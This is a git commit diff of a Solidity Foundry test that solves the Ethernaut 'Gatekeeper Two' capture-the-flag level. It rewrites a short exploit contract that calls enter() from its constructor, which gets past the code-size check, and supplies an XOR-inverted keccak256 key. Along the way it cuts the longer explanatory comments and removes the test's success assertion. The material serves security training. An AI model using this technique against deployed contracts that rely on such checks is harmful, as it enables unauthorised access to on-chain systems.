c76b60fd7bbb5a2fb5def7686213075c7db76268
maxsakhno <contactsakhno@gmail.com>
2024-11-29 06:43:29 +0100

    solved Gatekeeper Two

--- test/GatekeeperTwo.t.sol
+++ test/GatekeeperTwo.t.sol
@@ -24,8 +24,9 @@ contract TestGatekeeperTwo is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = GatekeeperTwo(levelAddress);
 
@@ -34,57 +35,32 @@ contract TestGatekeeperTwo is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
 
-        // SOLVE gateOne() check:
-        // To solve the gateOne barrier we need to have `msg.sender != tx.origin`
-        // If we have an external contract to call the `GatekeeperOne` contract
-        // for us in that case `msg.sender === ExploiterContract` but
-        // `tx.origin === playerAddress`
+        // To pass first gate, we need to call the enter function from another contract.
+        // However, the second gates implies that the entity calling the function cannot contain any code.
+        // This mean we have to call enter() in the transaction that creates the contract, because its code is only stored at the and of contructor().
 
-        // SOLVE gateTwo() check:
-        // A contract has two different bytes codes when compiled
-        // The creation bytecode and the runtime bytecode
-        // The runtime bytecode is the real code of the contract, the one stored in the blockchain
-        // The creation bytecode is the bytecode needed by Ethereum to create the contract and execute the constructor only once
-        // When the constructor is executed initializing the contract storage it returns the runtime bytecode
-        // Until the very end of the constructor the contract itself does not have any runtime bytecode
-        // So if you call address(contract).code.length it will return 0!
-        // If you want to read more about this at EVM level: https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/
-        // For this reason to pass the second gate we just need to call `enter` from the `Exploiter` constructor!
+        // To pass the third gate, we need to find a key that will make the following expression true
+        // Since keccak256 is deterministic, we can precalculate the key required to pass the gate three
+        // There is also an XOR operation that we need to understand to solve this gate
 
-        // SOLVE gateThree() check:
-        // We are talking again about converting between types and bit wise operations
-        // Let's look at the requirement
-        // `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1`
-        // The contract is compiled with a Solidity version prior to 0.8.x so it will not revert for underflow math
-        // uint64(0) - 1 is underflowing and is like saying "give me the max value that uint64 can represent"
-        // bytes8(keccak256(abi.encodePacked(msg.sender))) is taking the less important 8 bytes from the `msg.sender` (that is the Exploiter contract in this case)
-        // and casting them to a uint64
-        // a ^ b is the bit wise XOR operation
-        // The XOR operation works like this: if the bit in the position are equal it will result in a 0 otherwise in a 1
-        // in order to make a ^ b = type(uint64).max (so all 1) `b` must be the inverse of `a`
-        // it means that our `gateKey` must be the inverse of `bytes8(keccak256(abi.encodePacked(msg.sender)))`
-        // Inside our Exploiter we define contractByte8 as `bytes8(keccak256(abi.encodePacked(address(this))))`
-        // and the gateKey is equalt to contractByte8 ^ 0xFFFFFFFFFFFFFFFF
-        // In solidity there's no "inverse" operation but we can recreate it by doing the XOR between our input and a value with only `F`s
+        // We need to turn a precalculated part to have all its bets set to 1 to be equal to type(uint64).max
+        // It means that our key must be the inverse of the precalculated part
 
         vm.prank(player, player);
-        new Exploiter(level);
 
-        assertEq(level.entrant(), player);
+        Exploit exploit = new Exploit(level);
     }
 }
 
-contract Exploiter {
-    address private owner;
+contract Exploit {
+    constructor(GatekeeperTwo level) public {
+        bytes8 leftPart = bytes8(keccak256(abi.encodePacked(address(this))));
+        bytes8 key = leftPart ^ 0xFFFFFFFFFFFFFFFF;
 
-    constructor(GatekeeperTwo victim) public {
-        owner = msg.sender;
-
-        bytes8 contractByte8 = bytes8(keccak256(abi.encodePacked(address(this))));
-        bytes8 gateKey = contractByte8 ^ 0xFFFFFFFFFFFFFFFF;
-
-        victim.enter(gateKey);
+        level.enter(key);
     }
 }
